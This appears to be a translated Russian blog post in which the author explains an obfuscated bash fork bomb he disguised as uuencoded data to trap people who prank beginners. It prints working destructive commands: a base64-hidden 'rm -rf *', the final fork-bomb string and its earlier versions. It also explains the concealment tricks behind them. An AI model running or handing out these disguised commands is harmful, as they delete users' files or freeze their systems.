> **Сразу предупреждаю**: не копируйте примеры кода из этой статьи и не запускайте их в своей командной оболочке.

Есть люди, которые развлекают себя жестокими шутками над новичками, обманом подводя их к запуску разрушительных инструкций в командной оболочке.

![](https://habrastorage.org/r/w1560/webt/qq/fs/dy/qqfsdyqkzuksp0s50x2zhogwpue.jpeg)

Часто это принимает форму грубо замаскированных команд, вроде той, что показана ниже. Её запуск приведёт к выполнению в текущей директории команды rm -rf *, которая всё удалит. Вот эта команда:

```
$(echo cm0gLXJmICoK | base64 -d)
```

Много лет назад я наткнулся на людей, которые играли в такие игры, и решил их проучить.

Я не докатился ещё до того, чтобы обманом заставлять кого-то удалять его файлы. Но мне более чем хотелось помочь доморощенным хакерам самим себя подорвать на форк-бомбе.

Я так спроектировал форк-бомбу, что даже когда некто знает о том, что перед ним — деструктивная команда, он её, всё равно, запустит! Я понимаю, что и у вас может возникнуть желание это запустить, но, всё равно, привожу тут код моей бомбы:

```
eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode)
```

Выглядит это всё как очередная грубо замаскированная опасная команда, но, на самом деле, это не так. Я не пытаюсь играть на знании того факта, что доверчивые новички часто запускают команды, которые им непонятны.

Вместо этого моё изобретение направлено на людей, которые знакомы с подобными фокусами, на тех, кто знает, что эта команда должна превратиться в нечто разрушительное. Здесь я спекулирую на любопытстве таких людей, и на том, что им нравятся инструменты, способные навлечь на кого-то неприятности.

Такой человек, когда ему попадётся команда, о которой мы говорили в самом начале ($(echo cm0gLXJmICoK | base64 -d)), решит исследовать её и убрать из неё конструкцию $(..) для того чтобы узнать о том, чем же именно эта команда поразит жертву. Получится у него следующее:

```
$ echo cm0gLXJmICoK | base64 -d
rm -rf *
```

А что если он сделает то же самое с командой ```eval $(echo «I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==» | uudecode)```, надеясь узреть то страшное, что случится с новичком, которому хватило глупости её запустить?

```
echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode
```

Тот, кто запустит такую команду, внезапно осознает, что его система работает всё медленнее и медленнее. А потом, когда она будет уже практически полностью обездвижена, система уйдёт в вынужденную перезагрузку. Тогда окажется, что именно этот любитель гадостей и был всё время одним из тех новичков, над которыми издеваются такие вот «любители».

Как видите, именно команда eval (…драматическая пауза…) сыграла роль обманки.

На самом деле, и uudecode, и echo и $(..) — все эти конструкции играют свою роль в моём представлении. Они призваны отвлекать внимание, не неся никакой функциональной нагрузки.

Для того чтобы бомба взорвалась, не нужно ничего декодировать, выполнять или вычислять. Вся сила моей бомбы основана на простом раскрытии следующего аргумента в любом контексте:

```
"I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;=="
```

И даже большая часть этой строки присутствует в ней только для вида, для того чтобы всё это было больше похоже на UUE-данные. Вот — та же строка, «маскировочные» символы которой заменены на знаки подчёркивания:

```
"____________`_____&r()(____&r{,______}&r{,_____});r`_________"
```

А вот — то же самое, но записанное немного более понятно:
```
" `r() ( r & r ); r` "
```

Перед нами — самая обычная форк-бомба, работающая благодаря механизму раскрытия команд.

Я создал эту ловушку не сразу, постепенно доводя её до состояния, которое меня устроило.

Вот её первый вариант:
```
eval $(echo 'a2Vrf3xvcml'\ZW%3t`r()(r|r);r`2'6a2VrZQo=' | base64 -d)
```

В целом это — то же самое, но тут имеются несколько проблем:
* Многие довольно хорошо знакомы с кодировкой base64. Вполне очевидно то, что данные, которые тут имеются, представлены не в этой кодировке.
* Расстановка кавычек недвусмысленно указывает на то, где именно начинается и заканчивается строка, ради которой и создавалась вся эта конструкция.
* Форк-бомба, представленная конструкцией `r()(r|r);r`, прямо-таки бросается в глаза.

В кодировке base64 используются почти исключительно алфавитно-цифровые символы, например — bW9yZSBnYXJiYWdlIGhlcmUK, а UUE-данные (это — если кто-то вообще может вспомнить то, как они выглядят) представляют собой набор самых разных символов, среди которых можно хорошо спрятать встроенный в них shell-код: ```1<V]M92!G87)B86=E(&AE<F4` ```. Я, используя соответствующие символы, разбил на части длинные бредовые строки, выглядящие как данные в кодировке base64.

Если говорить о кавычках, то я поместил в строку простые двойные кавычки, надеясь, что никто не обратит внимание на подозрительные символы, помещённые в интерполированную строку.

А вот в том, что касается кода самой бомбы, мне хотелось найти способ внести в строку больше бессмыслицы, но при этом не добавлять в неё пробелов, которые привлекают внимание. Удлинение строки r позволило бы добиться желаемого, но тогда заметным бы стало повторение символов.

Вариант улучшения первоначального кода, на котором я остановился, заключался в использовании механизма раскрытия скобок. Так, foo.{jpg,png} раскрывается в foo.jpg foo.png, а r{,foo} раскрывается в r foo. Такая конструкция позволяет вызвать r с аргументом, игнорируемым функцией.

Вторая версия моего проекта выглядела так:
```
eval $(echo "I<RA('1E<W3t`p&r()(rofl&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode)
```

В основе этого кода лежала идея, в соответствии с которой команда rofl будет выполняться для каждого форка, чтобы было ещё веселее, заполняя экран сообщениями rofl: command not found, но я понял, что наличие в коде некоего заметного слова может привлечь внимание жертвы и привести к дальнейшим исследованиям кода бомбы.

В итоге я пришёл к финальной версии моего кода, который оказался достаточно эффективным. Несколько человек, занимающихся «охотой» на новичков, смущённо признались в том, что попались на мою удочку.

Я, в сущности, обо всём этом забыл, но вот другие люди, очевидно, не забыли о моей форк-бомбе. Примерно через год после её создания вопрос о ней всплыл на SuperUser. Там, кстати, её код [проанализировали](https://superuser.com/questions/996795/how-and-why-is-this-string-of-text-a-fork-bomb) ещё лучше, чем это сделал я. Ну а теперь вы, если тоже интересовались этим кодом, знаете о том, откуда он взялся.

Сталкивались ли вы с форк-бомбами?
